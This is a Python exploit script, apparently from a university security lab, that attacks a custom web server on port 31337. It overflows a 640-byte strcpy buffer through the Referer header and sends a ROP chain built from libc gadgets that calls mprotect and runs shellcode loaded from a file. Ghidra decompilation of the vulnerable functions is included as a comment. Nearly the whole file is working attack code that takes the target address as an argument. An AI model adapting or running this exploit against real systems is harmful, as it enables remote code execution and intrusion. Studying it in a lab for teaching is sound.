#!/usr/bin/python3

from socket import *
import struct
import sys
import urllib.request, urllib.parse, urllib.error

addr = '127.0.0.1'
if len(sys.argv) > 1:
    addr = sys.argv[1]
s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))

exploit = ""
with open("exploit64", "rb") as fh:
    exploit = fh.read() 	# exploit is 150 bytes

base = 0x7ffff7dc3000	# base of libc found using: `cat /proc/<pid of webserver_lab10>/maps/
mprotect_addr = 0xf7040 + base  # found using: `readelf -s /usr/lib64/libc-2.29.so | grep mprotect`
pop_rdi_addr = 0x023902 + base	# gadget (pop rdi; ret) found with `ROPgadget --binary /usr/lib64/libc-2.29.so`
pop_rsi_addr = 0x023e29 + base  # gadget (pop rsi; ret) found with `ROPgadget --binary /usr/lib64/libc-2.29.so`
pop_rdx_addr = 0x81796 + base   # gadget (pop rdx; ret) found with `ROPgadget --binary /usr/lib64/libc-2.29.so`
				# note: could also use ROPgadget with our binary, but glibc will have more instructions to grab
decode_addr = 0x0401dd6		# (after previous call to strcpy()) - address of custom function that calls sscanf() to decode
shell_addr = 0x41414020		# address of shellcode within the 41414000 page boundary (that mprotect will modify)
shell_page = 0x41414000		# found at the mmap() within Ghidra
size_arg = 0x1000		# size to make executable
prot_arg = 0x7		    	# value of PROT_READ | PROT_WRITE | PROT_EXEC

'''
# Vulernable Header w/in Ghidra
undefined8 FUN_0040220b(uint uParm1,char **ppcParm2)

{
  int iVar1;
  long lVar2;

  iVar1 = strcmp(ppcParm2[2],"HTCPCP");
  if (iVar1 == 0) {
    FUN_00401801((ulong)uParm1,"HTCPCP/1.0",0x1a2,"I\'m a teapot",ppcParm2);
  }
  else {
    iVar1 = strcmp(*ppcParm2,"POST");
    if (((iVar1 != 0) && (iVar1 = strcmp(*ppcParm2,"GET"), iVar1 != 0)) &&
       (iVar1 = strcmp(*ppcParm2,"HEAD"), iVar1 != 0)) {
      FUN_00401801((ulong)uParm1,"HTTP/1.1",0x195,"Method Not Allowed",ppcParm2);
      return 1;
    }
    lVar2 = FUN_004017ab(ppcParm2,"Referer");
    if (lVar2 != 0) {
      FUN_004021ca(lVar2);
    }
    FUN_00401801((ulong)uParm1,"HTTP/1.0",0x194,"Not Found",ppcParm2);
  }
  return 1;
}

# Vulnerable strcpy() w/in FUN_004021ca
undefined8 FUN_004021ca(char *pcParm1)
{
  char local_288 [640];
  strcpy(local_288,pcParm1);
  FUN_00401dd6(local_288); -> decode function
  return 1;
}
'''
PADLEN = 640
msg = b'GET /asdf.vbs HTTP/1.1\r\n'
msg += b'Referer:'

x = exploit
x += b'A' * (PADLEN - len(exploit))
x += b'\xFF'* 8		    		# RBP

x += struct.pack("<Q", pop_rdi_addr)    # loading args for mprotect (rdi -- address on page boundary to modify protections)
x += struct.pack("<Q", shell_page)      # 0x41414000

x += struct.pack("<Q", pop_rsi_addr)	# rsi -- length of protection (page size * pages)
x += struct.pack("<Q", size_arg)        # 0x1000

x += struct.pack("<Q", pop_rdx_addr)	# rdx -- protection mode applied to page(s)
x += struct.pack("<Q", prot_arg)        # 0x7

x += struct.pack("<Q", mprotect_addr)   # mprotect addr -- 0x7ffff7dc4000+0xf7040

x += struct.pack("<Q", pop_rdi_addr)    # loading args for decode
x += struct.pack("<Q", shell_addr)      # 0x41414020

x += struct.pack("<Q", decode_addr)	# 0x0401dd6 which contains the call to sscanf()

x += struct.pack("<Q", shell_addr)	# return addr (0x41414020) from mprotect (run shellcode)

msg += urllib.parse.quote(x).encode()

msg += b'\r\n\r\n'

s.send(msg)
